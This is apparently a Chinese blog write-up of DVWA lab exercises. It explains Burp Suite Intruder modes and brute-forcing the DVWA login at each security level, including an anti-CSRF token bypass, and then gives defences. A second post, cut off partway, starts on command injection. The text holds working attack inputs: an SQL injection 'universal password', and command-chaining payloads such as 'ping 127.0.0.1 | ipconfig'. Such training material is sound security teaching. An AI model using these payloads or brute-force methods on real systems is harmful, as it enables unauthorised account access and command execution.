Sniper：狙击手，可以指定多个变量同时进行破解，但是只设置一个字典文件，将指定的变量挨个用字典内容进行替换（常用） Batteringram：攻城锤，可以指定多个变量，但仍只设置一个字典文件，将所有的变量一起用字典文件内容进行替换 Ptichfork：草叉子，可以指定多个变量，但需要为每个变量分别设置一个字典文件，然后用对应的字典内容对变量同时进行替换 Cluster bomb：集数炸弹，指定多个变量，并为每个变量设置一个字典文件，然后用字典内容组合对变量进行替换（常用）  每对标记 ‘ § ’ 指示一个Payload位置。一对标记可以选择性地将模板请求中的一些文本括在它们之间。当有效载荷位置被分配了Payload时，标记和任何包含的文本都将被Payload替换。当有效载荷位置没有指定的Payload时，标记将被移除，但所附文本保持不变。 为了简化配置，Intruder模块会自动突出显示每对有效负载标记以及它们之间的任何封闭文本。您可以手动或自动放置有效负载标记。当您从Burp Suite中的其他模块向Intruder模块发送请求时，会猜测您可能想要放置有效负载的位置，并相应地设置有效负载标记。\n你可以使用选项上的按钮来控制位置上的标记：\n  add § — 在当前光标位置插入一个位置标记。\n  clear § — 删除整个模板或选中的部分模板里的位置标记。\n  auto § — 这会对放置标记的位置做一个猜测，放哪里会有用，然后就把标记放到相应位置。这是一个为攻击常规漏洞(SQL 注入)快速标记出合适位置的有用的功能，然后人工标记是为自定义攻击的。\n  refresh — 如果需要，可以刷新编辑器里有颜色的代码。\n  clear — 删除整个编辑器内容。\n  这里详细讲一下这四种攻击方式：\n这里转载自：点击\n假设有用户名和密码两个 position，词典如下： user1，user2，usre3 pass1，pass2，pass3\nSniper（狙击手模式）\n狙击手模式使用1组payload集合，它一次只使用一个payload位置 需要字典：1个 【payloadset部分只能选择1】 变量数量：不限 加载顺序：将字典依次填入所有变量中，下图设置了两个变量，所以Position会有两个\nBattering ram (攻城锤模式)\n需要字典：1个 【payloadset部分只能选择1】\n变量数量：不限\n加载顺序：将字典同时填入所有变量中，下图设置了两个变量，两个变量分别依次被填入了user1，user2，user3\nPitchfork（草叉子模式）\n允许使用多组payload组合，在每个标记位置上遍历所有payload组合 需要字典：N个 【payloadset可以选择N个】 变量数量：N个【需要和字段数量相同】 加载顺序：字典和变量分别对应，同时填入对应变量中，下图设置了两个变量，变量1依次被填入了user1，user2，user3，变量2依次被填入了pass1，pass2，pass3，user字典和pass字典一一对应\nCluster Bomb（集束炸弹模式）\n集束炸弹模式跟草叉模式不同的地方在于，集束炸弹模式会对payload组进行笛卡尔积 需要字典：N个 【payloadset可以选择N个】 变量数量：N个【需要和字段数量相同】 加载顺序：字典和变量分别对应，分别填入对应变量中，下图设置了两个变量，变量1依次被填入了user1，user2，user3 变量2首先被填入了pass1，然后是pass2，最后是pass3，user字典和pass字典分别对应，payload数量是 user字典数 X pass字段数\n3：Payloads 有效负荷选项(Payloads tab)\n这个选项是用来配置一个或多个有效负荷的集合。如果定义了”cluster bomb”和”pitchfork”攻击类型，然后必须为每定义的有效负荷位置(最多8个)配置一个单独的有效负荷。使用”payload set”下拉菜单选择要配置的有效负荷。\n选项1：Payload Sets\n载荷类型\u0026quot;Payload type\u0026quot;\n常用的有下面四种\n Simple list：可以手动添加字典列表，也可以导入Burpsuite自带的字典，或者导入自定义的字典。 Runtimely file：只能加载自定义的字典 Number：设定一个数值范围，从范围内依次或随机取值进行测试 Brute forcer：自己定义字符范围来生成字典文件  选项2：Payload Opetions[Simple list] 该选项会根据选项1中Payload type的设置而改变\n Paste 粘贴，就很容易理解，比方说你复制123456,然后点击Paste 就被粘贴了上去 Load 载入 就是载入你本地的字典 Remove 删除 就是删除你选中的某个字典 Clear 清理 清空所有字典（无论你粘贴的还是载入的） Add 自己编写一个字典 Add from list 这个模块下会有很多选项，其实就是burp自身提供的字典  这里的话再说一下Number载荷 （这个模块的话，sql注入盲注可以使用，猜字段数)\n（说实话下面的暂时还没有用到过，小声BB）\n选项3：Payload Processing 对生成的Payload进行编码、加密、截取等操作\n选项4：Payload Encoding 你可以配置哪些有效载荷中的字符应该是URL编码的HTTP请求中的安全传输。任何已配置的URL编码最后应用，任何有效载荷处理规则执行之后。 这是推荐使用此设置进行最终URL编码，而不是一个有效载荷处理规则，因为可以用来有效载荷的grep选项来检查响应为呼应有效载荷的最终URL编码应用之前。\n4：Opetions 选项卡(Options tab) 此选项卡包含了request headers，request engine，attack results ，grep match，grep_extrack，grep payloads和redirections。你可以发动攻击之前，在主要Intruder的UI上编辑这些选项，大部分设置也可以在攻击时对已在运行的窗口进行修改。\n选项1：Request Headers 这些设置控制在Intruder是否更新配置请求头。\n如果选中‘update Content-Length header’框，Burp Intruder 会使用每个请求的 HTTP 主体长度的正确值，添加或更新这个请求里 HTTP 消息头的内容长度。这个功能对一些需要把可变长度的有效载荷插入到 HTTP 请求模板主体的攻击是很有必要的。这个 HTTP 规范和大多数 web 服务器一样，需要使用消息头内容长度来指定 HTTP 主体长度的正确值。如果没有指定正确值，目标服务器会返回一个错误，也可能返回一个未完成的请求，也可能无限期地等待接收请求里的进一步数据。\n如果选中‘set Connection: close’框，则 Burp Intruder 会添加或更新 HTTP 消息头的连接来请求在每个请求后已关闭的连接。在多数情况下，这个选项会让攻击执行得更快。\n选项2：Request Engine 设置发送请求的线程、超时重试等。\n选项3：Attack Results 设置攻击结果的显示。\n选项4：Grep – Match 在响应中找出存在指定的内容的一项。\n注：可以将其他的匹配项clear 然后将错误的提示信息 ==(比方说\u0026quot;error\u0026quot;)== 写入Add中，告诉Burp Suite,出现error就是错误的\n在爆破过程中，提示error的字典后面会有✔\n如果没有提示的话，就不要设置这个部分了，我们可以根据字段的长度进行判断\n选项5：Grep – Extract 通过正则提取返回信息中的内容。\n选项6：Grep – Payloads 这些设置可以用于包含已提交的有效负载的反射的标志结果项目。如果启用了此选项，BurpSuite会添加包含一个复选框指示当前负载的值在每个响应发现新的结果列。\n选项7：Redirections 重定向响应，控制Burp在进行攻击时如何处理重定向。\n解题部分 Low 看一下题目，发现是个登录框\n如果抛开这个题目要求的话，看到登录框，我们还能想到的就是可能可以使用==SQL注入==\n这里先贴一下代码：\n\u0026lt;?php if( isset( $_GET[ 'Login' ] ) ) { // Get username $user = $_GET[ 'username' ]; // Get password $pass = $_GET[ 'password' ]; $pass = md5( $pass ); // Check the database $query = \u0026quot;SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\u0026quot;; $result = mysqli_query($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $query ) or die( '\u0026lt;pre\u0026gt;' . ((is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_error($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u0026lt;/pre\u0026gt;' ); if( $result \u0026amp;\u0026amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\u0026quot;avatar\u0026quot;]; // Login successful echo \u0026quot;\u0026lt;p\u0026gt;Welcome to the password protected area {$user}\u0026lt;/p\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;img src=\\\u0026quot;{$avatar}\\\u0026quot; /\u0026gt;\u0026quot;; } else { // Login failed echo \u0026quot;\u0026lt;pre\u0026gt;\u0026lt;br /\u0026gt;Username and/or password incorrect.\u0026lt;/pre\u0026gt;\u0026quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]))) ? false : $___mysqli_res); } ?\u0026gt;  我们可以看到这里：\nif( isset( $_GET[ 'Login' ] ) ) { // Get username $user = $_GET[ 'username' ]; // Get password $pass = $_GET[ 'password' ]; $pass = md5( $pass ); // Check the database $query = \u0026quot;SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\u0026quot;;  对于输入的东西，没有做任何过滤，直接拼接到了SQL语句中，可能存在==SQL注入==\n这里我们先尝试一下单引号admin '\n发现报错：\nYou have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'd41d8cd98f00b204e9800998ecf8427e'' at line 1  说明存在==SQL注入==\n这里加 # 注释掉 后面的AND 语句 登录成功\n当然前面注释成功说明，闭合方式为 ' ，我们可以构造万能密码\n也就是输入admin' or \u0026lsquo;1\u0026rsquo; =1'\n此时sql语句变为\nselect * from admin where `username` = 'admin' or '1' ='1' and `password` = '$pass'  这里同样登录成功\n回到题目，这里我们使用爆破的方法\n情况一：\n用户名(管理员)就是 admin\n抓包先，发到Intruder模块\n这里我选择 Sniper(狙击手)，并且将password 设置成变量\n然后开始构造Payload，对于第一个变量，直接添加一些常见的默认密码。\n然后点击Start attack开始爆破\n这里的话，看到password与其他密码的长度不一样，说明密码就是password\n情况二：\n如果管理员名字不是 admin 也就是说，我们既不知道username\n也不知道password\n这个时候我们就要改变攻击方式，这里使用 cluster bomb(集束炸弹)，并且设置username 和 password 两个变量\n然后开始构造Payload，对于第一个变量，直接添加一些常见的默认用户名。\n对于第二个变量，添加一些常见的默认密码（其实应该载入字典，因为时间紧，就直接写入了，其实原理是一样的）\n然后点击Start attack 开始爆破\n这里发现已经爆破成功\nMedium 首先我又尝试 ==SQL注入==\n发现无论是' 还是 \u0026quot; 还是') 还是 \u0026quot;) 还是')) 还是 \u0026quot;))均不报错，并且显示登录失败的时候，响应速度顿了你们几下，猜测这里应该是使用了sleep 函数\n这里看一下源码\n\u0026lt;?php if( isset( $_GET[ 'Login' ] ) ) { // Sanitise username input $user = $_GET[ 'username' ]; $user = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $user ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $pass ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); $pass = md5( $pass ); // Check the database $query = \u0026quot;SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\u0026quot;; $result = mysqli_query($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $query ) or die( '\u0026lt;pre\u0026gt;' . ((is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_error($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u0026lt;/pre\u0026gt;' ); if( $result \u0026amp;\u0026amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\u0026quot;avatar\u0026quot;]; // Login successful echo \u0026quot;\u0026lt;p\u0026gt;Welcome to the password protected area {$user}\u0026lt;/p\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;img src=\\\u0026quot;{$avatar}\\\u0026quot; /\u0026gt;\u0026quot;; } else { // Login failed sleep( 2 ); echo \u0026quot;\u0026lt;pre\u0026gt;\u0026lt;br /\u0026gt;Username and/or password incorrect.\u0026lt;/pre\u0026gt;\u0026quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]))) ? false : $___mysqli_res); } ?\u0026gt;  对用户名和密码处理的部分就在这里\nif( isset( $_GET[ 'Login' ] ) ) { // Sanitise username input $user = $_GET[ 'username' ]; $user = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $user ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $pass ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); $pass = md5( $pass );  mysqli_real_escape_string() 函数转义在 SQL 语句中使用的字符串中的特殊字符。\n语法：\n mysqli_real_escape_string(connection,escapestring);     参数 描述     connection 必需。规定要使用的 MySQL 连接。   escapestring 必需。要转义的字符串。编码的字符是 NUL（ASCII 0）、\\n、\\r、\\、'、\u0026quot; 和 Control-Z。    这里，在登录失败的时候，使用了sleep 函数，和我们想象的一样\nelse { // Login failed sleep( 2 ); echo \u0026quot;\u0026lt;pre\u0026gt;\u0026lt;br /\u0026gt;Username and/or password incorrect.\u0026lt;/pre\u0026gt;\u0026quot;; }  那我们就只能爆破了\n其实步骤的话和 Low关卡差不多，只是爆破的时间会久一点，因为登录失败的话会执行 sleep 函数\n这里的话，我们直接假设用户名和密码都不知道\n使用 Cluster bomb(集束炸弹) ，将用户名和密码设置为变量\n步骤的话和上面一样，就只放图了\n拿下\nHigh 既然Medium，对sql注入 进行了防御，到了High 就识趣的不进行注入尝试了🐶,不过这关有点难啊\u0026hellip;\n这里贴一下代码：\n\u0026lt;?php if( isset( $_GET[ 'Login' ] ) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_GET[ 'username' ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $user ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); // Sanitise password input $pass = $_GET[ 'password' ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $pass ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); $pass = md5( $pass ); // Check database $query = \u0026quot;SELECT * FROM `users` WHERE user = '$user' AND password = '$pass';\u0026quot;; $result = mysqli_query($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $query ) or die( '\u0026lt;pre\u0026gt;' . ((is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_error($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) : (($___mysqli_res = mysqli_connect_error()) ? $___mysqli_res : false)) . '\u0026lt;/pre\u0026gt;' ); if( $result \u0026amp;\u0026amp; mysqli_num_rows( $result ) == 1 ) { // Get users details $row = mysqli_fetch_assoc( $result ); $avatar = $row[\u0026quot;avatar\u0026quot;]; // Login successful echo \u0026quot;\u0026lt;p\u0026gt;Welcome to the password protected area {$user}\u0026lt;/p\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;img src=\\\u0026quot;{$avatar}\\\u0026quot; /\u0026gt;\u0026quot;; } else { // Login failed sleep( rand( 0, 3 ) ); echo \u0026quot;\u0026lt;pre\u0026gt;\u0026lt;br /\u0026gt;Username and/or password incorrect.\u0026lt;/pre\u0026gt;\u0026quot;; } ((is_null($___mysqli_res = mysqli_close($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]))) ? false : $___mysqli_res); } // Generate Anti-CSRF token generateSessionToken(); ?\u0026gt;   stripslashes() 函数删除由 addslashes() 函数添加的反斜杠。  提示：该函数可用于清理从数据库中或者从 HTML 表单中取回的数据。\n这一关加入了Token 验证，在页面测试几次就会发现\n每次服务器返回的登陆页面中都会包含一个随机的user_token的值， 用户每次登录时都要将user_token一起提交。服务器收到请求后，会优先做token的检查，再进行sql查询。\n除此之外，使用了stripslashes(去除字符串中的反斜线字符,如果有两个连续的反斜线,则只去掉一个)，mysql_real_escape_string对参数username、password进行过滤、转义，进一步抵御sql注入。\n这里的话，有两种解题办法，第一种是使用python脚本，可惜现在还不会\u0026hellip;（python真是个好家伙,赶紧学python\u0026hellip;）\n那就直接跳到第二种，使用burp\n抓包，设置变量（这回我们就不设置用户名处的变量了）\n攻击类型选择pitchfork(草叉模式)：它可以使用多组Payload集合，在每一个不同的Payload标志位置上(最多20个)，遍历所有的Payload。举例来说，如果有两个Payload标志位置，第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为B和D。\n第一个参数变量，也就是密码处的变量，为了节省时间，还是自己写入几个常见的密码\n接下来设置第二个参数（token）\n 进入到Options中，找到 Grep-Extract，意思是用于提取响应消息中的有用信息，在Grep - Extract模块中，点击Add，出现下图，先点击刷新相应信息， 在下方的内容栏里找到user_token后面的部分，把value=\u0026lsquo;后面的数字（即服务器返回的token，表示每次从响应中获取该值）选中，并且复制该值，一会儿会用到。   设置为爆破前先请求(访问首页一次)   设置payload，，第二个参数选择Recursive grep，然后将options中的token作为第一次请求的初始值。  注：上图的服务器每次返回的数据，其实就是更新后的token\n 设置参数，在option选项卡中将攻击线程thread设置为1，因为Recursive_Grep模式不支持多线程攻击，然后选择Grep-Extract，意思是用于提取响应消息中的有用信息，点击Add，如下图进行设置，最后将Redirections设置为Always   点击start attack攻击爆破，结果成功爆破，如下图所示：   这里详细的说一下token的原理\n每次访问，服务器都会返回一个新的token\n第一次访问：\n刷新一下：\n可以发现，token值改变了\n那么token是如何获取的呢？\n是根据这个函数：\n// Generate Anti-CSRF token generateSessionToken();  但是由于这个函数在代码的最后，所以获取的这个token值，是给下一次的请求使用的\n每次发送的时候，都带上了一个 user_token，每次发送请求的时候 user_token 都是会变的，而 user_token 是来自于上一个数据包的。\n这里说一下token：\nToken，也叫令牌，是随机生成的一组序列，一般用在两个地方:\n1、防止表单重复提交\n2、 Anti-CSRF攻击\n原理上都是通过session token来实现的：当客户端请求页面时，服务器会生成一个随机数Token，并且将Token放置到session当中，然后将Token发给客户端（一般通过构造hidden表单）。下次客户端提交请求时，Token会随着表单一起提交到服务器端。\n1、防止表单重复提交：服务器端第一次验证相同过后，会将session中的Token值更新下，若用户重复提交，第二次的验证判断将失败，因为用户提交的表单中的Token没变，但服务器端session中Token已经改变。\n2、 Anti-CSRF攻击：服务器端会对Token值进行验证，判断是否和session中的Token值相等，若相等，则可以证明请求有效，不是伪造的，若不相等，则请求不能通过\n浏览器的执行过程\n这里我们会发现,第一次登陆首页之后就会自动生成,之后每次都在不断变化,显然是很难捕捉的.但是登陆首页是不需要token的. 那么我们可以针对这个作为突破口. 我们爆破的每次都重新登陆一次首页,这样就能获得它的token值了\n 流程为：访问首页–\u0026gt;获取user_token–\u0026gt;发送数据包请求, 重复以上动作,直至尝试成功.\n 所以burp的工作就是，每次爆破之前先访问一次，将返回的token添加到这次爆破中。 此时user_token和session_token  一致，请求通过\n我理解的流程图大概是这个样子的\n Impossible 这里贴一下代码先：\n\u0026lt;?php if( isset( $_POST[ 'Login' ] ) \u0026amp;\u0026amp; isset ($_POST['username']) \u0026amp;\u0026amp; isset ($_POST['password']) ) { // Check Anti-CSRF token checkToken( $_REQUEST[ 'user_token' ], $_SESSION[ 'session_token' ], 'index.php' ); // Sanitise username input $user = $_POST[ 'username' ]; $user = stripslashes( $user ); $user = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $user ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); // Sanitise password input $pass = $_POST[ 'password' ]; $pass = stripslashes( $pass ); $pass = ((isset($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;]) \u0026amp;\u0026amp; is_object($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;])) ? mysqli_real_escape_string($GLOBALS[\u0026quot;___mysqli_ston\u0026quot;], $pass ) : ((trigger_error(\u0026quot;[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\u0026quot;, E_USER_ERROR)) ? \u0026quot;\u0026quot; : \u0026quot;\u0026quot;)); $pass = md5( $pass ); // Default values $total_failed_login = 3; $lockout_time = 15; $account_locked = false; // Check the database (Check user information) $data = $db-\u0026gt;prepare( 'SELECT failed_login, last_login FROM users WHERE user = (:user) LIMIT 1;' ); $data-\u0026gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-\u0026gt;execute(); $row = $data-\u0026gt;fetch(); // Check to see if the user has been locked out. if( ( $data-\u0026gt;rowCount() == 1 ) \u0026amp;\u0026amp; ( $row[ 'failed_login' ] \u0026gt;= $total_failed_login ) ) { // User locked out. Note, using this method would allow for user enumeration! //echo \u0026quot;\u0026lt;pre\u0026gt;\u0026lt;br /\u0026gt;This account has been locked due to too many incorrect logins.\u0026lt;/pre\u0026gt;\u0026quot;; // Calculate when the user would be allowed to login again $last_login = strtotime( $row[ 'last_login' ] ); $timeout = $last_login + ($lockout_time * 60); $timenow = time(); /* print \u0026quot;The last login was: \u0026quot; . date (\u0026quot;h:i:s\u0026quot;, $last_login) . \u0026quot;\u0026lt;br /\u0026gt;\u0026quot;; print \u0026quot;The timenow is: \u0026quot; . date (\u0026quot;h:i:s\u0026quot;, $timenow) . \u0026quot;\u0026lt;br /\u0026gt;\u0026quot;; print \u0026quot;The timeout is: \u0026quot; . date (\u0026quot;h:i:s\u0026quot;, $timeout) . \u0026quot;\u0026lt;br /\u0026gt;\u0026quot;; */ // Check to see if enough time has passed, if it hasn't locked the account if( $timenow \u0026lt; $timeout ) { $account_locked = true; // print \u0026quot;The account is locked\u0026lt;br /\u0026gt;\u0026quot;; } } // Check the database (if username matches the password) $data = $db-\u0026gt;prepare( 'SELECT * FROM users WHERE user = (:user) AND password = (:password) LIMIT 1;' ); $data-\u0026gt;bindParam( ':user', $user, PDO::PARAM_STR); $data-\u0026gt;bindParam( ':password', $pass, PDO::PARAM_STR ); $data-\u0026gt;execute(); $row = $data-\u0026gt;fetch(); // If its a valid login... if( ( $data-\u0026gt;rowCount() == 1 ) \u0026amp;\u0026amp; ( $account_locked == false ) ) { // Get users details $avatar = $row[ 'avatar' ]; $failed_login = $row[ 'failed_login' ]; $last_login = $row[ 'last_login' ]; // Login successful echo \u0026quot;\u0026lt;p\u0026gt;Welcome to the password protected area \u0026lt;em\u0026gt;{$user}\u0026lt;/em\u0026gt;\u0026lt;/p\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;img src=\\\u0026quot;{$avatar}\\\u0026quot; /\u0026gt;\u0026quot;; // Had the account been locked out since last login? if( $failed_login \u0026gt;= $total_failed_login ) { echo \u0026quot;\u0026lt;p\u0026gt;\u0026lt;em\u0026gt;Warning\u0026lt;/em\u0026gt;: Someone might of been brute forcing your account.\u0026lt;/p\u0026gt;\u0026quot;; echo \u0026quot;\u0026lt;p\u0026gt;Number of login attempts: \u0026lt;em\u0026gt;{$failed_login}\u0026lt;/em\u0026gt;.\u0026lt;br /\u0026gt;Last login attempt was at: \u0026lt;em\u0026gt;${last_login}\u0026lt;/em\u0026gt;.\u0026lt;/p\u0026gt;\u0026quot;; } // Reset bad login count $data = $db-\u0026gt;prepare( 'UPDATE users SET failed_login = \u0026quot;0\u0026quot; WHERE user = (:user) LIMIT 1;' ); $data-\u0026gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-\u0026gt;execute(); } else { // Login failed sleep( rand( 2, 4 ) ); // Give the user some feedback echo \u0026quot;\u0026lt;pre\u0026gt;\u0026lt;br /\u0026gt;Username and/or password incorrect.\u0026lt;br /\u0026gt;\u0026lt;br/\u0026gt;Alternative, the account has been locked because of too many failed logins.\u0026lt;br /\u0026gt;If this is the case, \u0026lt;em\u0026gt;please try again in {$lockout_time} minutes\u0026lt;/em\u0026gt;.\u0026lt;/pre\u0026gt;\u0026quot;; // Update bad login count $data = $db-\u0026gt;prepare( 'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;' ); $data-\u0026gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-\u0026gt;execute(); } // Set the last login time $data = $db-\u0026gt;prepare( 'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;' ); $data-\u0026gt;bindParam( ':user', $user, PDO::PARAM_STR ); $data-\u0026gt;execute(); } // Generate Anti-CSRF token generateSessionToken(); ?\u0026gt;  可以看到Impossible级别的代码加入了可靠的防爆破机制，当检测到频繁的错误登录后，系统会将账户锁定，爆破也就无法继续。\n同时采用了更为安全的PDO（PHP Data Object）机制防御sql注入，这是因为不能使用PDO扩展本身执行任何数据库操作，而sql注入的关键就是通过破坏sql语句结构执行恶意的sql命令\n进阶  爆破的字典选什么是一个技巧，可以使用top100等账号密码进行爆破 通过社工获取目标信息，再使用字典生成器生成字典进行爆破 如果爆破目标有验证码可以使用pkav或者其他识别验证码的接口爆破  防御  用户层面就是要避免使用弱口令，弱口令当然不止使用admin，root这类的，还有姓名拼音，键盘连续字符等 服务方进行对多次登陆失败的账户可以锁ip 使用短信验证码，语言验证码等验证方式，为了用户体验好，可以设置一个阀值，当超过这个阀值再进行验证 使用复杂点的验证码，增加攻击者攻击成本  ","date":"2020-05-11","permalink":"https://Phoenix-Pl.github.io/post/dvwa%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3/","tags":["DVWA"],"title":"从DVWA看Brute Force(暴力破解)"},{"content":"漏洞产生的原因 在web程序中，因为业务功能需求要通过web前端传递参数到后台服务器上执行（特别是一些网络设备的web管理界面），但由于开发人员没有对输入进行严格的过滤，导致漏洞攻击者可以通过提交恶意构造的参数破坏命令语句结构，从而达到执行恶意命令的目的。PHP命令注入攻击漏洞是PHP应用程序中常见的脚本漏洞之一，国内著名的Web应用程序Discuz!、DedeCMS等都曾经存在过该类型漏洞。\n漏洞危害 如果web应用使用的是root权限则该漏洞可以导致攻击者在服务器上执行任意命令。\n先解决个小问题 打开题目，提示 Enter an IP address\n这里我们输入 127.0.0.1 试一下\n发现这里都是乱码，可能是因为DVWA是在windows下部署的原因，底层系统是中文GBK编码所致。\n通过查阅资料得知在 \u0026hellip;/DVWA/dvwa/includes目录下，有个dvwaPage.inc.php文件\n打开查找 Content-Type, 进行修改，将全部的charset=UTF-8改为 charset=GBK\n问题解决~\n解题篇 Low 代码及分析\n\u0026lt;?php if( isset( $_POST[ 'Submit' ] ) ) { // Get input //判断是否点了提交按钮 $target = $_REQUEST[ 'ip' ]; //把输入的信息放在target变量中 // Determine OS and execute the ping command. if( stristr( php_uname( 's' ), 'Windows NT' ) ) { //判断是否是window系统 // Windows $cmd = shell_exec( 'ping ' . $target ); } else { //判断是否是Linux系统 // Linux $cmd = shell_exec( 'ping -c 4 ' . $target ); } // Feedback for the end user echo \u0026quot;\u0026lt;pre\u0026gt;{$cmd}\u0026lt;/pre\u0026gt;\u0026quot;; } ?\u0026gt;  函数解释：\n  php_uname() 返回运行 PHP 的系统的有关信息\n'a'：此为默认。包含序列 \u0026quot;s n r v m\u0026quot; 里的所有模式。 's'：操作系统名称。例如： FreeBSD。 'n'：主机名。例如： localhost.example.com。 'r'：版本名称，例如： 5.1.2-RELEASE。 'v'：版本信息。操作系统之间有很大的不同。 'm'：机器类型。例如：i386。    shell_exec(cmd) 让php网页程序可以执行一些操作系统的命令（==命令执行漏洞主要是因为这个函数==）如果不对用户输入的命令进行过滤，那么理论上就可以执行任意系统命令，也就相当于直接获得了系统级的shell\n  stristr()\n  这里先 ping 一下127.0.0.1\n发现可以，那能不能执行以下别的命令呢，这里我们尝试一下net user 命令\n发现报错了\n如果我们只能ping个IP 也起不到什么作用，怎么才能执行其他的命令呢？\n这个时候就该上知识点了，我们可以使用 | \u0026amp; || \u0026amp;\u0026amp; 这四种符合拼接命令进行执行\n允许同时执行多条命令的符号\n \u0026ldquo;|\u0026quot;：前面命令输出结果作为后面命令的输入内容 \u0026ldquo;\u0026amp;\u0026quot;：前面命令执行后接着执行后面的命令 \u0026ldquo;\u0026amp;\u0026amp;\u0026quot;：前面命令执行成功了才执行后面的命令  以上三种连接符在windows和linux环境下都指支持\n  \u0026ldquo;||\u0026quot;：前面命令执行失败的时候才执行后面的命令（==支持windows==）\n  Linux系统还可以使用分号(;)同时执行多条命令\n  还可以使用重定向(\u0026gt;)在服务器中生成文件，或是使用(\u0026lt;)从事先准备好的文件读入命令等\n  例如： ping 127.0.0.1 | ipconfig ping 127.0.0.1 \u0026amp; ipconfig ping 127.0.0.1 || ipconfig ping 127.0.0.1 